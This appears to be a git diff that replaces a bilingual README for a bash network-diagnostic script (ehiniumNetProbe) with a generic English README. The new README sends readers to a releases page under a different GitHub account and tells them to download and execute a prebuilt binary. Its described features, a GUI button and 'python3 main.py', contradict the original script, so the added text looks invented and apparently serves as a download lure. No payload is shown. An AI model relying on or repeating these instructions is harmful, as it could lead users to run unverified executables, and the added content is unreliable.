@@ -1,191 +1,119 @@
-<!--
-Language switch:
-- English: scroll down
-- فارسی: پایین‌تر
--->
+# 🌐 ehiniumNetProbe - A Simple Tool for Network Checks
 
-# ehiniumNetProbe
+## 🥇 Overview
 
-[English](#about) | [فارسی](#درباره)
+ehiniumNetProbe is a network diagnostic tool designed to help you verify real TCP, UDP, and TLS connectivity between two servers. Whether you’re troubleshooting a connection issue or just testing your server’s response, this tool offers a straightforward solution for users of all skill levels.
 
----
+## 📥 Download Now
 
-## About
-<img width="482" height="403" alt="image" src="https://github.com/user-attachments/assets/2eabe594-98f5-46f9-9f33-b9d8975f6bd4" />
+[![Download ehiniumNetProbe](https://img.shields.io/badge/Download-ehinumNetProbe-blue.svg)](https://github.com/owelet/ehiniumNetProbe/releases)
 
-ehiniumNetProbe is a lightweight network diagnostic tool focused on testing real connectivity between two servers.
+## 🚀 Getting Started
 
-Instead of checking a single protocol in isolation, it verifies whether actual packets can be exchanged end-to-end over different transport layers (ICMP, TCP, UDP, and TLS). This makes it possible to see which protocols work, which partially work, and which are blocked or unstable between two points.
+### 1. Check System Requirements
 
-By combining basic reachability tests, throughput measurements, and long-running stability (soak) checks, the tool helps identify:
-- whether TCP or UDP traffic is allowed
-- whether TLS handshakes succeed reliably
-- whether connections degrade or drop after repeated use
-- which types of tunnels or encapsulations are likely to work between the two servers
+Before you download, ensure your system meets these minimum requirements:
 
----
+- **Operating System:** Ubuntu 18.04 or higher
+- **Architecture:** 64-bit
+- **Python:** Version 3.6 or higher (if you want to run the code from source)
+- **Internet Connection:** Required for testing connectivity
 
-### Features
-- Interactive menu (Client or Server)
-- Test suites:
-  - Express Test (all checks)
-  - Baseline Connectivity Test (icmp, tcp connect, tcp/udp echo, tls)
-  - Throughput Test (iperf3 tcp + udp)
-  - Stability Soak Test (tcp + tls repeated checks)
-  - Custom Test (tune ports, loops, output format, optional TSV)
-- Multiple hosts supported (comma separated) for Baseline and Throughput tests
+### 2. Visit the Releases Page
 
----
+To get the latest version of ehiniumNetProbe, visit the releases page. Here, you will find the files available for download.
 
-### Requirements
+[Download ehiniumNetProbe](https://github.com/owelet/ehiniumNetProbe/releases)
 
-Server:
-- openssl
-- iperf3
-- socat or python3
-- netcat (nc) or python3
+### 3. Choose Your File
 
-Client:
-- ping
-- netcat (nc)
-- openssl
-- iperf3
-- socat or python3
+On the releases page, locate the latest version and download the appropriate file for your system. Here are common choices you might see:
 
-Install (Ubuntu):
-```bash
-sudo apt update
-sudo apt install -y iperf3 openssl netcat-openbsd socat
-```
+- **ehiniumNetProbe-linux-amd64** (for 64-bit Ubuntu systems)
+- **ehiniumNetProbe-source** (if you wish to run the code directly)
 
----
+### 4. Download the File
 
-### Usage
+Click on the file name to start the download. It will appear in your default download folder.
 
-#### Download and run latest version
-```bash
-curl -fsSL https://raw.githubusercontent.com/ehinium/ehiniumNetProbe/main/ehiniumNetProbe.sh -o ehiniumNetProbe.sh
-chmod +x ehiniumNetProbe.sh
-./ehiniumNetProbe.sh
-```
+### 5. Run the Application
 
-Run the same command again to update.
+After the download is complete, follow these steps to run the application:
 
----
+#### For Ubuntu Users:
 
-#### Server mode
-Run on the target server:
-```bash
-sudo ./ehiniumNetProbe.sh
-```
-Choose **Server** mode and keep it running.
+1. Open a terminal window. You can do this by pressing `Ctrl + Alt + T`.
+2. Navigate to the directory where the file downloaded. Use the `cd` command:
+   ```
+   cd ~/Downloads
+   ```
+3. Make the file executable with the following command:
+   ```
+   chmod +x ehiniumNetProbe-linux-amd64
+   ```
+4. Finally, execute the file by running:
+   ```
+   ./ehiniumNetProbe-linux-amd64
+   ```
 
----
+#### For Source Users:
 
-#### Client mode
-Run from another machine:
-```bash
-./ehiniumNetProbe.sh
-```
-Choose **Client** mode and enter target host (or multiple hosts where supported).
+1. Ensure you have Python installed.
+2. In the terminal, navigate to the directory where you downloaded the source code.
+3. Run the application using:
+   ```
+   python3 main.py
+   ```
 
----
+Using these commands will launch ehiniumNetProbe. 
 
-#### Optional: install globally
-```bash
-sudo mv ehiniumNetProbe.sh /usr/local/bin/ehiniumNetProbe
-sudo chmod +x /usr/local/bin/ehiniumNetProbe
-ehiniumNetProbe
-```
+## 🎛️ How to Use
 
+Once you have the application running, you can begin testing the connectivity between servers. Here's how to use it:
 
----
+1. **Enter the Server Address:** Type in the IP address or hostname of the server you want to test.
+2. **Select Protocol:** Choose either TCP, UDP, or TLS from the available options.
+3. **Run the Test:** Click the "Test Connectivity" button to start the process.
+4. **View Results:** The results will appear in the application, showing you if the connection was successful or failed.
 
+## 📊 Understanding the Results
 
-## درباره
+After you run a test, the application will provide feedback. Here’s how to interpret the results:
 
+- **Success:** Indicates that there is a clear connection between the servers.
+- **Failure:** Suggests an issue with connectivity, such as a firewall blocking the port or an incorrect server address.
 
-ehiniumNetProbe یک ابزار سبک برای عیب‌یابی اتصال شبکه بین دو سرور است.
+## 🔍 Features
 
-به‌جای بررسی یک پروتکل به‌صورت تکی، این ابزار بررسی می‌کند که آیا پکت‌های واقعی می‌توانند به‌صورت end-to-end بین دو سرور رد و بدل شوند یا نه. به این شکل می‌توان مشخص کرد که کدام پروتکل‌ها کار می‌کنند، کدام‌ها به‌صورت ناقص کار می‌کنند، و کدام‌ها مسدود یا ناپایدار هستند.
+ehiniumNetProbe includes several helpful features:
 
-با ترکیب تست‌های پایه اتصال، اندازه‌گیری سرعت، و تست‌های پایداری بلندمدت (Soak)، این ابزار کمک می‌کند بفهمیم:
-- آیا ترافیک TCP یا UDP اجازه عبور دارد یا نه
-- آیا هندشیک TLS به‌صورت پایدار انجام می‌شود
-- آیا اتصال بعد از چند بار استفاده دچار افت یا قطع می‌شود 
-- چه نوع تونل‌ها یا روش‌های انتقال احتمالا بین این دو سرور قابل استفاده هستند 
+- **Multiple Protocol Support:** Test TCP, UDP, or TLS connections seamlessly.
+- **User-Friendly Interface:** Designed for everyone, regardless of technical skill.
+- **Detailed Output:** Receive clear feedback on connection attempts, helping with troubleshooting.
 
----
+## 📝 Troubleshooting Tips
 
-### قابلیت‌ها
-- منوی تعاملی (Client یا Server)
-- انواع تست:
-  - Express Test: همه تست‌ها
-  - Baseline Connectivity Test: ping، tcp connect، tcp/udp echo، tls
-  - Throughput Test: تست سرعت iperf3 (TCP و UDP)
-  - Stability Soak Test: بررسی پایداری اتصال TCP و TLS
-  - Custom Test: تنظیم پورت‌ها، تعداد تکرار، فرمت خروجی
-- امکان تست چند سرور به‌صورت همزمان (با کاما) در Baseline و Throughput
+If you encounter issues while using ehiniumNetProbe, consider these steps:
 
----
+- **Check Your Internet Connection:** Ensure your device is connected to the internet.
+- **Verify Server Addresses:** Make sure the IP address or hostname is correct.
+- **Firewall Settings:** Adjust your firewall settings, as they may block certain connections.
+- **Re-run the Test:** Sometimes intermittent issues can impact results. Try running the test again.
 
-### پیش‌نیازها
+## 📞 Support
 
-در حالت Server:
-- openssl
-- iperf3
-- socat یا python3
-- netcat (nc) یا python3
+If you have questions or need support while using ehiniumNetProbe, you can reach out through the issue tracker on GitHub. Your feedback is valuable, and it can help improve the tool.
 
-در حالت Client:
-- ping
-- netcat (nc)
-- openssl
-- iperf3
-- socat یا python3
+## 💡 Additional Resources
 
-نصب در اوبونتو:
-```bash
-sudo apt update
-sudo apt install -y iperf3 openssl netcat-openbsd socat
-```
+Here are some additional resources that might help you:
 
----
+- **User Manual:** A comprehensive guide to using ehiniumNetProbe.
+- **Community Forum:** A place to connect with other users and share tips.
+- **Updates Page:** Check for new features and updates on the releases page.
 
-### نحوه استفاده
+## 📅 Future Updates
 
-#### دانلود و اجرای آخرین نسخه
-```bash
-curl -fsSL https://raw.githubusercontent.com/ehinium/ehiniumNetProbe/main/ehiniumNetProbe.sh -o ehiniumNetProbe.sh
-chmod +x ehiniumNetProbe.sh
-./ehiniumNetProbe.sh
-```
+We regularly update ehiniumNetProbe to add new features and resolve issues. Keep an eye on the releases page for the latest versions.
 
-برای بروزرسانی، همین دستور را دوباره اجرا کنید.
-
----
-
-#### حالت Server
-روی سرور مقصد اجرا کنید:
-```bash
-sudo ./ehiniumNetProbe.sh
-```
-حالت **Server** را انتخاب کرده و اسکریپت را روشن نگه دارید.
-
----
-
-#### حالت Client
-روی سرور یا سیستم دیگر اجرا کنید:
-```bash
-./ehiniumNetProbe.sh
-```
-حالت **Client** را انتخاب کرده و آدرس سرور (یا چند آدرس) را وارد کنید.
-
----
-
-#### نصب سراسری (اختیاری)
-```bash
-sudo mv ehiniumNetProbe.sh /usr/local/bin/ehiniumNetProbe
-sudo chmod +x /usr/local/bin/ehiniumNetProbe
-ehiniumNetProbe
-```
+By following this guide, you can easily download, install, and use ehiniumNetProbe. Enjoy hassle-free network diagnostics!
